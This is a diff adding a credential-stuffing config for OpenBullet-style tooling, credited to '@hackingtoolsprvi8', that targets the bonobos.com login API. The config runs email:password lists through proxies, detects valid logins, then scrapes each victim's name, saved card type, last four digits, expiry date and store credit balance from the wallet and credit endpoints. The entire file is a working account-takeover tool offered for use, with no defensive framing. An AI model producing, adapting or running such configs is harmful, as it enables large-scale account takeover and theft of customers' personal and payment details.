@@ -1,0 +1,141 @@
+[SETTINGS]
+{
+  "Name": "Bonobos(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-23T12:32:14.5011572+02:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GetSource REQUEST GET "https://bonobos.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#AuthToken PARSE "<SOURCE>" LR ",\"clientAuthToken\":\"" "\",\"" -> VAR "1" 
+
+#PostLogin REQUEST POST "https://highline-bff.bonobos.com/api/sessions" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"optanonConsentCookieId\":null,\"skip_shipping_and_tax_calc\":true,\"constructorio_cookie\":\"a5f59486-8dc8-477d-92c4-e583b2f1b5b5\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json;v=2.0;schema=gramercy" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 187" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://bonobos.com" 
+  HEADER "referer: https://bonobos.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36" 
+  HEADER "x-client-authentication-token: <1>" 
+
+#Valid? KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login failed. Please try again" 
+  KEYCHAIN Success OR 
+    KEY "user_id" 
+
+#First PARSE "<SOURCE>" JSON "first_name" -> VAR "First" 
+
+#Last PARSE "<SOURCE>" JSON "last_name" -> VAR "Last" 
+
+#Full_Name FUNCTION Constant "<First> <Last>" -> CAP "Name" 
+
+#AuthToken PARSE "<SOURCE>" JSON "authentication_token" -> VAR "2" 
+
+#GetWallet REQUEST GET "https://api.bonobos.com/api/wallet" 
+  
+  HEADER "Host: api.bonobos.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: application/json;v=2.0;schema=gramercy" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "X-Client-Authentication-Token: <1>" 
+  HEADER "X-Authentication-Token: <2>" 
+  HEADER "Origin: https://bonobos.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://bonobos.com/account/wallet" 
+
+#Issuer PARSE "<SOURCE>" JSON "type" -> VAR "Issuer" 
+
+FUNCTION Translate 
+  KEY "visa" VALUE "VISA" 
+  KEY "amex" VALUE "AMEX" 
+  KEY "mc" VALUE "MASTERCARD" 
+  KEY "uspindebit" VALUE "DEBIT" 
+  KEY "paypal" VALUE "PAYPAL" 
+  "<Issuer>" -> VAR "CardType" 
+
+#Last4 PARSE "<SOURCE>" JSON "last_digits" -> VAR "Last4" 
+
+#Month PARSE "<SOURCE>" JSON "month" -> VAR "Month" 
+
+#Year PARSE "<SOURCE>" JSON "year" -> VAR "Year" 
+
+FUNCTION Constant "<CardType> *<Last4> <Month>/<Year>" -> CAP "Card" 
+
+#GetStoreCredit REQUEST GET "https://api.bonobos.com/api/store_credit" 
+  
+  HEADER "Host: api.bonobos.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: application/json;v=2.0;schema=gramercy" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "X-Client-Authentication-Token: <1>" 
+  HEADER "X-Authentication-Token: <2>" 
+  HEADER "Origin: https://bonobos.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://bonobos.com/account" 
+
+#StoreCredits PARSE "<SOURCE>" JSON "user_total_amount" CreateEmpty=FALSE -> CAP "Store Credits" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
